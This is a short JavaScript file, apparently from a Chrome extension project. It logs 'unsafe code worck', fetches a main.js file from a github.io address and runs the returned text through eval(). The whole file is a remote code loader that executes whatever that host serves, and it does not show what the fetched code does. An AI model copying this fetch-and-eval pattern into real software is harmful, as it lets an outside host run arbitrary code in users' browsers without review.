console.log('unsafe code worck');


const databaseUrl = 'https://kostya778899.github.io/GoogleChromeExtensions/App_Base_00/Database/Version_00/';


fetch(databaseUrl + 'main.js').then(function (response) {
    response.text().then(function (text) {
        eval(text);
    });
});